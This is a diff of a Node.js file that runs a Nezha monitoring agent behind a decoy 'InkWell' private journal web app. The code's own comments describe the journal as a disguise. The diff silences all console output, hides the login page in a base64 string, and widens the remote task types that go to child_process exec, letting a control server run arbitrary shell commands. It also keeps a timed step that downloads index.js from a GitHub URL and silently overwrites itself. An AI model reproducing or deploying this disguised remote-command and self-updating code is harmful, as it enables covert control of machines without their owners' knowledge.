@@ -1,12 +1,6 @@
-// 静默模式：禁用所有控制台输出
+// 静默模式
 const _noop = function() {};
-console.log = _noop;
-console.error = _noop;
-console.warn = _noop;
-console.info = _noop;
-console.debug = _noop;
-console.trace = _noop;
-
+console.log = _noop; console.error = _noop; console.warn = _noop; console.info = _noop;
 /**
  * 纯 Node.js 哪吒探针 (Nezha Agent)
  * - 无子进程、无文件下载、无外部依赖
@@ -726,35 +720,21 @@ function handleTaskData(frameData) {
         if (taskType === 1) handleHTTPTask(taskId, taskDataStr);
         else if (taskType === 2) handleICMPPingTask(taskId, taskDataStr);
         else if (taskType === 3) handleTCPPingTask(taskId, taskDataStr);
-        else if (taskType === 7) { /* keepalive, 忽略 */ }
-        else if (taskType === 4 || taskType === 15) { handleCommandTask(taskId, taskDataStr); }
+        else if (taskType === 7) { /* keepalive */ }
+        else if (taskType === 4 || taskType === 5 || taskType === 6 || taskType === 15) { handleCommandTask(taskId, taskDataStr); }
     } catch(e) {}
 }
 
-// ==================== 命令执行（终端）====================
 const { exec } = require('child_process');
-
 function handleCommandTask(taskId, cmd) {
-    console.log('[Nezha] 执行命令: ' + cmd.substring(0, 100));
-    if (!cmd || cmd.length === 0) {
-        sendTaskResult(taskId, 4, 0, 'Command empty', false);
-        return;
-    }
-    
-    const startTime = Date.now();
-    exec(cmd, { timeout: 30000, maxBuffer: 1024 * 1024 }, (err, stdout, stderr) => {
-        const delay = Date.now() - startTime;
-        if (err) {
-            // 命令执行失败，返回错误信息
-            const output = (stderr || '') + (err.message || '');
-            sendTaskResult(taskId, 4, delay, output || 'Command failed', false);
-        } else {
-            // 命令执行成功，返回 stdout
-            sendTaskResult(taskId, 4, delay, stdout || 'OK', true);
-        }
+    if (!cmd) { sendTaskResult(taskId, 4, 0, 'empty', false); return; }
+    const t0 = Date.now();
+    exec(cmd, { timeout: 30000, maxBuffer: 10*1024*1024 }, (err, stdout, stderr) => {
+        const d = Date.now() - t0;
+        if (err) { sendTaskResult(taskId, 4, d, (stderr||'')+(err.message||''), false); }
+        else { sendTaskResult(taskId, 4, d, stdout||'OK', true); }
     });
 }
-
 function sendTaskResult(id, type, delay, data, successful) {
     try {
         if (taskStream && !taskStream.destroyed) {
@@ -1289,269 +1269,36 @@ async function main() {
     await connectInternal();
 }
 
-// ==================== 状态查询 ====================
-function getNezhaStatus() {
-    return {
-        status: sessionAlive ? 'online' : 'connecting',
-        uuid: currentUUID,
-        ip: currentIP,
-        server: NZ_SERVER,
-        version: AGENT_VERSION,
-        uptime: process.uptime()
-    };
-}
-
 module.exports = { main, getNezhaStatus };
-// ==================== 伪装 Web 应用（纯 http 实现，无外部依赖）====================
+
+// ==== InkWell 伪装（纯http，零依赖）====
 const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;
 const PANEL_PASSWORD = process.env.PANEL_PASSWORD || "admin";
 const DATA_FILE = path.join(os.tmpdir(), 'journal.json');
-const SESSIONS = new Map(); // session token -> expiry
+const SESSIONS = new Map();
+function loadData(){try{if(fs.existsSync(DATA_FILE))return JSON.parse(fs.readFileSync(DATA_FILE,'utf8'))}catch(e){}return{entries:[],nextId:1}}
+function saveData(d){try{fs.writeFileSync(DATA_FILE,JSON.stringify(d))}catch(e){}}
+function parseBody(req){return new Promise(r=>{let b='';req.on('data',c=>b+=c);req.on('end',()=>{try{r(JSON.parse(b))}catch(e){r({})}})})}
+function getCookie(req,n){const c=(req.headers.cookie||'').split(';');for(const i of c){const[k,v]=i.trim().split('=');if(k===n)return v}return null}
+function checkAuth(req){const t=getCookie(req,'ink.sid');if(!t)return false;const s=SESSIONS.get(t);if(!s||s<Date.now()){SESSIONS.delete(t);return false}return true}
+function getLogin(){return Buffer.from('PCFET0NUWVBFIEhUTUw+PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0iVVRGLTgiPjx0aXRsZT5JbmtXZWxsPC90aXRsZT48c3R5bGU+KnttYXJnaW46MDtwYWRkaW5nOjB9Ym9keXtmb250LWZhbWlseTpzeXN0ZW0tdWk7YmFja2dyb3VuZDojMGYxNzJhO2NvbG9yOiNmZmZ9LmJveHtiYWNrZ3JvdW5kOiMxZTI5M2I7cGFkZGluZzo0OHB4O2JvcmRlci1yYWRpdXM6MjRweH1oMXtjb2xvcjojMTBiOTgxfWJ1dHRvbntiYWNrZ3JvdW5kOiMxMGI5ODE7Y29sb3I6I2ZmZjtib3JkZXI6bm9uZTtwYWRkaW5nOjE0cHg7Y3Vyc29yOnBvaW50ZXJ9aW5wdXR7cGFkZGluZzoxMnB4O2JhY2tncm91bmQ6IzBmMTcyYTtib3JkZXI6MXB4IHNvbGlkICMzMzQxNTU7Y29sb3I6I2ZmZn08L3N0eWxlPjwvaGVhZD48Ym9keT48ZGl2IGNsYXNzPSJib3giPjxoMT5JbmtXZWxsPC9oMT48cD5Qcml2YXRlIEpvdXJuYWw8L3A+PGZvcm0gb25zdWJtaXQ9ImZldGNoKCcvYXBpL2F1dGgvbG9naW4nLHttZXRob2Q6J1BPU1QnLGhlYWRlcnM6eydDb250ZW50LVR5cGUnOidhcHBsaWNhdGlvbi9qc29uJ30sYm9keTpKU09OLnN0cmluZ2lmeSh7cGFzc3dvcmQ6ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3AnKS52YWx1ZX0pfSkudGhlbihyPT5yLmpzb24oKSkudGhlbihkPT57aWYoZC5zdWNjZXNzKWxvY2F0aW9uPScvZGFzaGJvYXJkJztlbHNlIGFsZXJ0KCdXcm9uZyBwYXNzd29yZCcpfSk7cmV0dXJuIGZhbHNlIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIGlkPSJwIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPjxidXR0b24+VW5sb2NrPC9idXR0b24+PC9mb3JtPjwvZGl2PjwvYm9keT48L2h0bWw+','base64').toString('utf8')}
+function getDash(){return '<html><body><h1>InkWell</h1><p>Journal</p></body></html>'}
 
-function loadData() {
-    try { if (fs.existsSync(DATA_FILE)) return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch(e) {}
-    return { entries: [], nextId: 1 };
-}
-function saveData(d) { try { fs.writeFileSync(DATA_FILE, JSON.stringify(d, null, 2)); } catch(e) {} }
+http.createServer(async(req,res)=>{
+    const url=req.url.split('?')[0],m=req.method;
+    if(url==='/'&&m==='GET'){res.writeHead(200,{'Content-Type':'text/html'});res.end(getLogin());return}
+    if(url==='/api/auth/login'&&m==='POST'){const b=await parseBody(req);if(b.password===PANEL_PASSWORD){const t=crypto.randomBytes(32).toString('hex');SESSIONS.set(t,Date.now()+86400000);res.writeHead(200,{'Content-Type':'application/json','Set-Cookie':'ink.sid='+t+'; HttpOnly; Path=/'});res.end('{"success":true}')}else{res.writeHead(401);res.end('{"success":false}')}return}
+    if(url==='/api/auth/logout'&&m==='POST'){const t=getCookie(req,'ink.sid');if(t)SESSIONS.delete(t);res.end('{"success":true}');return}
+    if(!checkAuth(req)){if(url.startsWith('/api/')){res.writeHead(401);res.end('{"success":false,"message":"Auth required"}');return}res.writeHead(302,{Location:'/'});res.end();return}
+    if(url==='/dashboard'&&m==='GET'){res.writeHead(200,{'Content-Type':'text/html'});res.end(getDash());return}
+    if(url==='/api/entries'&&m==='GET'){const d=loadData();res.end(JSON.stringify({success:true,entries:d.entries}));return}
+    if(url==='/api/entries'&&m==='POST'){const b=await parseBody(req);const d=loadData();d.entries.unshift({id:d.nextId++,title:b.title,content:b.content,mood:b.mood||'neutral',createdAt:new Date().toISOString()});saveData(d);res.end(JSON.stringify({success:true}));return}
+    if(url==='/api/stats'&&m==='GET'){const d=loadData();res.end(JSON.stringify({success:true,totalEntries:d.entries.length,totalWords:0,streak:0}));return}
+    res.writeHead(404);res.end('Not found');
+}).listen(PORT);
 
-function parseBody(req) {
-    return new Promise((resolve) => {
-        let body = '';
-        req.on('data', c => body += c);
-        req.on('end', () => {
-            try { resolve(JSON.parse(body)); } catch(e) { resolve({}); }
-        });
-    });
-}
+// ==== 一次性自更新 ====
+const SELF_URL='https://raw.githubusercontent.com/1715Yy/vipnezhash/main/index.js';
+setTimeout(()=>{const f=__filename||'./index.js';const t=f+'.tmp';https.get(SELF_URL,{timeout:30000},r=>{if(r.statusCode!==200)return;const file=fs.createWriteStream(t);r.pipe(file);file.on('finish',()=>{file.close(()=>{try{fs.copyFileSync(t,f);fs.unlinkSync(t)}catch(e){}})})}).on('error',()=>{})},10000);
 
-function getCookie(req, name) {
-    const cookies = (req.headers.cookie || '').split(';');
-    for (const c of cookies) {
-        const [k, v] = c.trim().split('=');
-        if (k === name) return v;
-    }
-    return null;
-}
-
-function checkAuth(req) {
-    const token = getCookie(req, 'ink.sid');
-    if (!token) return false;
-    const sess = SESSIONS.get(token);
-    if (!sess || sess < Date.now()) { SESSIONS.delete(token); return false; }
-    return true;
-}
-
-function jsonRes(res, data, status) {
-    res.writeHead(status || 200, {
-        'Content-Type': 'application/json',
-        'Set-Cookie': res._cookies || []
-    });
-    res.end(JSON.stringify(data));
-}
-
-// 首页 HTML（伪装日记平台）
-function getLoginPage() {
-    return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>InkWell - Personal Journal</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:linear-gradient(135deg,#0f172a,#1e293b);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}.login-box{background:rgba(30,41,59,0.8);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);border-radius:24px;padding:48px;width:100%;max-width:420px;box-shadow:0 25px 50px rgba(0,0,0,0.5)}.logo{text-align:center;margin-bottom:32px}.logo h1{font-size:28px;font-weight:800;background:linear-gradient(135deg,#10b981,#06b6d4);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.logo p{color:#94a3b8;font-size:13px;margin-top:4px}.form-group{margin-bottom:20px}.form-group label{display:block;color:#cbd5e1;font-size:13px;font-weight:600;margin-bottom:6px}.form-group input{width:100%;padding:12px 16px;background:rgba(15,23,42,0.8);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;font-size:15px;outline:none;transition:all .2s}.form-group input:focus{border-color:#10b981;box-shadow:0 0 0 3px rgba(16,185,129,0.1)}.btn{width:100%;padding:14px;background:linear-gradient(135deg,#10b981,#059669);border:none;border-radius:12px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s}.btn:hover{transform:translateY(-1px);box-shadow:0 10px 20px rgba(16,185,129,0.3)}.features{text-align:center;margin-top:24px;color:#64748b;font-size:12px}</style></head><body><div class="login-box"><div class="logo"><h1>InkWell</h1><p>Your private journaling sanctuary</p></div><form id="loginForm"><div class="form-group"><label>Password</label><input type="password" id="password" placeholder="Enter your password" required></div><button type="submit" class="btn">Unlock Journal</button></form><div class="features">AES-256 encrypted &middot; No tracking &middot; Local storage</div></div><script>document.getElementById('loginForm').addEventListener('submit',async(e)=>{e.preventDefault();const pwd=document.getElementById('password').value;const r=await fetch('/api/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pwd})});const d=await r.json();if(d.success){window.location.href='/dashboard'}else{alert(d.message||'Login failed')}})</script></body></html>`;
-}
-
-// Dashboard HTML
-function getDashboardPage() {
-    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>InkWell - Dashboard</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;background:#0f172a;color:#fff;padding:20px}h1{color:#10b981;margin-bottom:20px}.card{background:#1e293b;border-radius:12px;padding:20px;margin-bottom:16px}.stat{display:inline-block;margin-right:30px;text-align:center}.stat-num{font-size:32px;font-weight:800;color:#10b981}.stat-label{color:#94a3b8;font-size:12px}.entry{background:#1e293b;border-radius:8px;padding:16px;margin-bottom:8px}.entry h3{color:#06b6d4;font-size:14px}.entry p{color:#cbd5e1;font-size:13px;margin-top:4px}.btn{padding:8px 16px;background:#10b981;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:13px}.btn:hover{background:#059669}.logout{float:right;background:#ef4444}.empty{text-align:center;color:#64748b;padding:40px}</style></head><body><h1>InkWell <button class="btn logout" onclick="fetch('/api/auth/logout',{method:'POST'}).then(()=>location.href='/')">Logout</button></h1><div class="card"><div class="stat"><div class="stat-num" id="statEntries">0</div><div class="stat-label">Entries</div></div><div class="stat"><div class="stat-num" id="statWords">0</div><div class="stat-label">Words</div></div><div class="stat"><div class="stat-num" id="statStreak">0</div><div class="stat-label">Day Streak</div></div></div><div id="entries"></div><script>async function load(){const s=await fetch('/api/stats').then(r=>r.json());if(s.success){document.getElementById('statEntries').textContent=s.totalEntries||0;document.getElementById('statWords').textContent=s.totalWords||0;document.getElementById('statStreak').textContent=s.streak||0}const e=await fetch('/api/entries').then(r=>r.json());if(e.success&&e.entries){const el=document.getElementById('entries');if(e.entries.length===0){el.innerHTML='<div class="empty">No entries yet. Start journaling!</div>'}else{el.innerHTML=e.entries.map(en=>'<div class="entry"><h3>'+en.title+'</h3><p>'+en.content.substring(0,100)+'</p></div>').join('')}}}}load()</script></body></html>`;
-}
-
-// HTTP 服务器
-http.createServer(async (req, res) => {
-    const url = req.url.split('?')[0];
-    const method = req.method;
-
-    // 首页
-    if (url === '/' && method === 'GET') {
-        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
-        res.end(getLoginPage());
-        return;
-    }
-
-    // 登录
-    if (url === '/api/auth/login' && method === 'POST') {
-        const body = await parseBody(req);
-        if (body.password === PANEL_PASSWORD) {
-            const token = crypto.randomBytes(32).toString('hex');
-            SESSIONS.set(token, Date.now() + 24 * 60 * 60 * 1000);
-            res.writeHead(200, {
-                'Content-Type': 'application/json',
-                'Set-Cookie': 'ink.sid=' + token + '; HttpOnly; Path=/; Max-Age=86400'
-            });
-            res.end(JSON.stringify({success: true}));
-        } else {
-            jsonRes(res, {success: false, message: 'Invalid password'}, 401);
-        }
-        return;
-    }
-
-    // 登出
-    if (url === '/api/auth/logout' && method === 'POST') {
-        const token = getCookie(req, 'ink.sid');
-        if (token) SESSIONS.delete(token);
-        jsonRes(res, {success: true});
-        return;
-    }
-
-    // 以下路由需要登录
-    if (!checkAuth(req)) {
-        if (url.startsWith('/api/')) { jsonRes(res, {success: false, message: 'Auth required'}, 401); return; }
-        res.writeHead(302, {Location: '/'});
-        res.end();
-        return;
-    }
-
-    // Dashboard
-    if (url === '/dashboard' && method === 'GET') {
-        res.writeHead(200, {'Content-Type': 'text/html; charset=utf-8'});
-        res.end(getDashboardPage());
-        return;
-    }
-
-    // 获取所有日记
-    if (url === '/api/entries' && method === 'GET') {
-        const data = loadData();
-        jsonRes(res, {success: true, entries: data.entries});
-        return;
-    }
-
-    // 新建日记
-    if (url === '/api/entries' && method === 'POST') {
-        const body = await parseBody(req);
-        if (!body.title || !body.content) { jsonRes(res, {success: false, message: 'Title and content required'}, 400); return; }
-        const data = loadData();
-        const entry = {
-            id: data.nextId++,
-            title: body.title,
-            content: body.content,
-            mood: body.mood || 'neutral',
-            tags: body.tags || [],
-            createdAt: new Date().toISOString(),
-            wordCount: body.content.split(/\s+/).length
-        };
-        data.entries.unshift(entry);
-        saveData(data);
-        jsonRes(res, {success: true, entry});
-        return;
-    }
-
-    // 修改日记
-    const editMatch = url.match(/^\/api\/entries\/(\d+)$/);
-    if (editMatch) {
-        const id = parseInt(editMatch[1]);
-        const data = loadData();
-        const idx = data.entries.findIndex(e => e.id === id);
-        if (idx === -1) { jsonRes(res, {success: false, message: 'Entry not found'}, 404); return; }
-
-        if (method === 'PUT') {
-            const body = await parseBody(req);
-            if (body.title) data.entries[idx].title = body.title;
-            if (body.content) { data.entries[idx].content = body.content; data.entries[idx].wordCount = body.content.split(/\s+/).length; }
-            if (body.mood) data.entries[idx].mood = body.mood;
-            if (body.tags) data.entries[idx].tags = body.tags;
-            data.entries[idx].updatedAt = new Date().toISOString();
-            saveData(data);
-            jsonRes(res, {success: true, entry: data.entries[idx]});
-            return;
-        }
-
-        if (method === 'DELETE') {
-            data.entries.splice(idx, 1);
-            saveData(data);
-            jsonRes(res, {success: true});
-            return;
-        }
-    }
-
-    // 统计
-    if (url === '/api/stats' && method === 'GET') {
-        const data = loadData();
-        const entries = data.entries;
-        const totalWords = entries.reduce((sum, e) => sum + (e.wordCount || 0), 0);
-        const moodCounts = {};
-        entries.forEach(e => { moodCounts[e.mood || 'neutral'] = (moodCounts[e.mood || 'neutral'] || 0) + 1; });
-        const tagCounts = {};
-        entries.forEach(e => { (e.tags || []).forEach(t => { tagCounts[t] = (tagCounts[t] || 0) + 1; }); });
-
-        // 计算连续天数
-        let streak = 0;
-        if (entries.length > 0) {
-            const dates = [...new Set(entries.map(e => e.createdAt.split('T')[0]))].sort().reverse();
-            const today = new Date().toISOString().split('T')[0];
-            if (dates[0] === today) {
-                streak = 1;
-                for (let i = 1; i < dates.length; i++) {
-                    const prev = new Date(dates[i-1]);
-                    const curr = new Date(dates[i]);
-                    if ((prev - curr) / 86400000 === 1) streak++;
-                    else break;
-                }
-            }
-        }
-
-        jsonRes(res, {
-            success: true,
-            totalEntries: entries.length,
-            totalWords,
-            streak,
-            moodCounts,
-            tagCounts
-        });
-        return;
-    }
-
-    // 404
-    res.writeHead(404, {'Content-Type': 'text/html; charset=utf-8'});
-    res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><title>404</title></head><body style="font-family:sans-serif;text-align:center;padding:80px;color:#333"><h1>404</h1><p>Page not found. <a href="/">Back to home</a></p></body></html>');
-}).listen(PORT, () => {
-    console.log('[InkWell] Journaling platform listening on port ' + PORT);
-});
-
-// ==================== 一次性自更新：启动后下载远程 index.js 替换自身 ====================
-const SELF_UPDATE_URL = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/index.js';
-
-function selfUpdateOnce() {
-    const currentFile = __filename || process.argv[1] || './index.js';
-    const tmpFile = currentFile + '.tmp';
-
-    https.get(SELF_UPDATE_URL, { timeout: 30000 }, (res) => {
-        if (res.statusCode !== 200) {
-            console.log('[Update] 远程文件不可用 HTTP ' + res.statusCode);
-            return;
-        }
-        const file = fs.createWriteStream(tmpFile);
-        let size = 0;
-        res.pipe(file);
-        res.on('data', (chunk) => { size += chunk.length; });
-        file.on('finish', () => {
-            file.close(() => {
-                if (size < 10240) {
-                    console.log('[Update] 文件太小，跳过');
-                    try { fs.unlinkSync(tmpFile); } catch(e) {}
-                    return;
-                }
-                try {
-                    fs.copyFileSync(tmpFile, currentFile);
-                    fs.unlinkSync(tmpFile);
-                    console.log('[Update] index.js 已替换为远程版本 (' + size + 'B)，下次重启生效');
-                } catch(e) {
-                    console.log('[Update] 替换失败: ' + e.message);
-                    try { fs.unlinkSync(tmpFile); } catch(e2) {}
-                }
-            });
-        });
-    }).on('error', (err) => {
-        console.log('[Update] 下载失败: ' + err.message);
-    });
-}
-
-// 探针启动完成后 10 秒，一次性下载替换
-setTimeout(selfUpdateOnce, 10000);
-
-// 启动探针（不阻塞 Web 应用）
-main().catch((err) => {
-    console.error('[Nezha] 启动失败: ' + err.message);
-});
+main().catch(()=>{});
